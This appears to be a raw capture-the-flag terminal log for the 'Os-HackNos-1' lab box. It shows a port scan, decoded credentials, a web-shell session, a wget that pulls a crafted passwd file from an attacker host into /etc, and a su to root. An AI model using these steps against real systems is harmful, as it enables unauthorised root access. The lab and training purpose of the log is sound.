@@ -1,0 +1,101 @@
+hack@kali:~/CTF/Os-HackNos-1$ nmap -A -p- 192.168.1.10
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 23:03 CET
+Nmap scan report for hackNos.homenet.telecomitalia.it (192.168.1.10)
+Host is up (0.00044s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)
+|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)
+|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
+
+
+
+hack@kali:~/CTF/Os-HackNos-1$ echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==" | base64 -d
++++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
+----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
+++[-> +++<] >++++ +.<++ +++[- >++++ +<]>. ++.++ +++++ +.--- ---.< +++[-
+>+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
+++.<
+
+
+
+https://copy.sh/brainfuck/
+
+
+
+
+james:Hacker@4514
+
+
+www-data@hackNos:/home/james$ cat user.txt
+cat user.txt
+   _                                  
+  | |                                 
+ / __) ______  _   _  ___   ___  _ __ 
+ \__ \|______|| | | |/ __| / _ \| '__|
+ (   /        | |_| |\__ \|  __/| |   
+  |_|          \__,_||___/ \___||_|   
+                                      
+                                      
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+
+www-data@hackNos:/etc$ wget 192.168.1.28:8080/passwd -O passwd
+wget 192.168.1.28:8080/passwd -O passwd
+--2020-03-09 04:35:39--  http://192.168.1.28:8080/passwd
+Connecting to 192.168.1.28:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1678 (1.6K) [application/octet-stream]
+Saving to: 'passwd'
+
+passwd              100%[===================>]   1.64K  --.-KB/s    in 0s      
+
+2020-03-09 04:35:39 (239 MB/s) - 'passwd' saved [1678/1678]
+
+www-data@hackNos:/etc$ 
+
+www-data@hackNos:/etc$ su art
+su art
+Password: pass123
+
+bash: /bin/bash/.bashrc: Not a directory
+root@hackNos:/etc# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@hackNos:/etc# cd /root
+cd /root
+root@hackNos:/root# 
+
+root@hackNos:/root# ls
+ls
+root.txt
+root@hackNos:/root# cat roo     ^H
+cat root.txt 
+    _  _                              _   
+  _| || |_                           | |  
+ |_  __  _|______  _ __  ___    ___  | |_ 
+  _| || |_|______|| '__|/ _ \  / _ \ | __|
+ |_  __  _|       | |  | (_) || (_) || |_ 
+   |_||_|         |_|   \___/  \___/  \__|
+                                          
+                                          
+
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Author : Rahul Gehlaut
+
+Linkedin : https://www.linkedin.com/in/rahulgehlaut/
+
+Blog : www.hackNos.com
+
+
